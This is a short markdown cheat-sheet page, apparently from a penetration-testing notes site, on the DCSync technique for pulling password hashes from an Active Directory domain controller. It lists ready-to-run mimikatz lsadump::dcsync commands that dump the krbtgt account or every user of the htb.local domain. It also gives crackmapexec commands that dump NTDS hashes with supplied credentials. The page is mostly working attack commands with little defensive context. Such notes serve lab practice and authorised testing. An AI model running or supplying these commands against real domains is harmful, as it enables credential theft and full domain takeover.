---
description: >-
  DCSync is a technique used by attackers to obtain sensitive information,
  including password hashes, from a domain controller in an Active Directory
  environment. Any member of Administrators, Domain Ad
---

# 🟢 DCSync

DCSync is a technique used by attackers to obtain sensitive information, including password hashes, from a domain controller in an Active Directory environment.&#x20;

Any member of Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts are able to run DCSync to pull password data.

*   DCSync only one user

    ```
    mimikatz# lsadump::dcsync /domain:htb.local /user:krbtgt
    ```
*   DCSync all users of the domain

    ```
    mimikatz# lsadump::dcsync /domain:htb.local /all /csv
    ```

```
crackmapexec smb 10.10.10.10 -u 'username' -p 'password' --ntds
crackmapexec smb 10.10.10.10 -u 'username' -p 'password' --ntds drsuapi
```
